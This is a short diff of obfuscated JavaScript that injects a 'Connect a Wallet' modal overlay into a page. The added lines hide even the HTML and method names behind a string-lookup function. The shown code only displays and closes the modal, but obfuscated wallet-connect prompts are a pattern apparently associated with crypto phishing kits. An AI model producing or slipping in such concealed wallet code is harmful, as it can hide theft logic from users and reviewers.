-        const _0x27749f = '\n            <div id="sw-modal-overlay" style="display: none; position: fixed; inset: 0; background-color: rgba(0,0,0,0.75); align-items: center; justify-content: center; z-index: 1000;">\n                <div id="sw-wallet-modal" style="background-color: #1f2937; border-radius: 16px; padding: 24px; width: 100%; max-width: 384px; color: white; transition: all 0.3s ease; opacity: 0; transform: scale(0.95);">\n                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">\n                        <h2 style="font-size: 24px; font-weight: 600; margin: 0;">Connect a Wallet</h2>\n                        <button id="sw-close-wallet-modal-btn" style="background: none; border: none; color: #9ca3af; font-size: 28px; cursor: pointer;">&times;</button>\n                    </div>\n                    <div id="sw-wallet-list" style="max-height: 300px; overflow-y: auto;"></div>\n                </div>\n            </div>\n            <div id="sw-status-message" style="margin-top: 16px; min-height: 20px;"></div>\n        ';
-        document[_0x593d('0x5e')]['insertAdjacentHTML']('beforeend', _0x27749f);
-        const _0x1c448d = this[_0x593d('0x6f')][_0x593d('0x35')](this);
-        document['getElementById']('sw-close-wallet-modal-btn')[_0x593d('0x5b')]('click', _0x1c448d);
-        document['getElementById']('sw-modal-overlay')[_0x593d('0x5b')](_0x593d('0x33'), _0x173a11 => {
-            if (_0x173a11[_0x593d('0x72')]['id'] === 'sw-modal-overlay') _0x1c448d();
+        var d = _0x272b;
+        if (document[d('0x2e')](d('0x9e'))) return;
+        const e = d('0xb4');
+        document[d('0x5e')][d('0xab')](d('0x3a'), e);
+        const f = this[d('0xa9')][d('0x6a')](this);
+        document[d('0x2e')](d('0xb8'))[d('0x88')](d('0x49'), f);
+        document[d('0x2e')](d('0x9e'))[d('0x88')](d('0x49'), g => {
+            if (g['target']['id'] === d('0x9e')) f();
         });
     }
 };
